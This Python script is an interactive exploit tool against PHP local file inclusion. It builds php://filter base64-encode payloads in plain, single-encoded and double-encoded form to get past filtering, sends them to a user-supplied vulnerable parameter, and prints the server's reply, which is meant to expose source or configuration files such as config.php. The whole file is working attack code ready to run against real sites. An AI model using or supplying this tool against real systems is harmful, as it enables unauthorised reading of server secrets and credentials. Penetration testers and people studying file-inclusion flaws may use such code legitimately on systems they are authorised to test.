import urllib.parse
import requests


class PHPFilterExploit:
    def __init__(self, url, file_to_open):
        self.url = url.rstrip('?')  # Ensure no trailing '?' in the URL
        self.file_to_open = file_to_open
        print(f"[+] Target URL: {self.url}")
        print(f"[+] Target file: {self.file_to_open}")

    def choice_method(self):
        print("\n[+] Select an attack method:")
        print("    1 - PHP Filters exploit with no encoding")
        print("    2 - PHP Filters exploit with double encoding")
        print("    3 - PHP Filters exploit with simple encoding")

        choice = input("Enter your choice (1, 2, or 3): ").strip()

        if choice == '1':
            print("[+] You have chosen the first method (no encoding)")
            response = self.attack_with_no_encoding()
        elif choice == '2':
            print("[+] You have chosen the second method (double encoding)")
            response = self.attack_with_double_encoding()
        elif choice == '3':
            print("[+] You have chosen the third method (simple encoding)")
            response = self.attack_with_simple_encoding()
        else:
            print("[-] Invalid choice, please try again")
            return self.choice_method()

        print(f"[+] Server response:  {response}")

    def attack_with_no_encoding(self):
        string = f'php://filter/convert.base64-encode/resource={self.file_to_open}'
        full_url = f"{self.url}{urllib.parse.quote(string, safe='')}"
        print(f"[+] Generated URL: {full_url}")
        return self.send_request(full_url)

    def attack_with_double_encoding(self):
        encoded_string = urllib.parse.quote(
            urllib.parse.quote(f'php://filter/convert.base64-encode/resource={self.file_to_open}', safe=''),
            safe=''
        ).replace("-", "%252d").replace(".", "%252e")
        full_url = f"{self.url}{encoded_string}"
        print(f"[+] Generated URL: {full_url}")
        return self.send_request(full_url)

    def attack_with_simple_encoding(self):
        encoded_string = urllib.parse.quote(f'php://filter/convert.base64-encode/resource={self.file_to_open}',
                                            safe='').replace("-", "%2d").replace(".", "%2e")
        full_url = f"{self.url}{encoded_string}"
        print(f"[+] Generated URL: {full_url}")
        return self.send_request(full_url)

    def send_request(self, url):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print("[+] Request successful! Status Code: 200")
                return response.text
            else:
                print(f"[-] Request failed. Status Code: {response.status_code}")
                return f"[-] Error: {response.status_code}"
        except requests.RequestException as e:
            print(f"[-] Failed to connect to {url} - Error: {str(e)}")
            return f"[-] Connection error: {str(e)}"


def main():
    print("Example of base URL (including the parameter):")
    print("http://example.com/index.php?file=")
    url = input("Enter the base URL (including the parameter): ").strip()
    print("\nExample of file to read (e.g., a configuration file):")
    print("conf or config.php")
    file_to_open = input("Enter the file to read: ").strip()

    if not url or not file_to_open:
        print("[-] Error: Both the base URL and file name must be provided.")
        return

    exploit = PHPFilterExploit(url, file_to_open)
    exploit.choice_method()


if __name__ == "__main__":
    main()
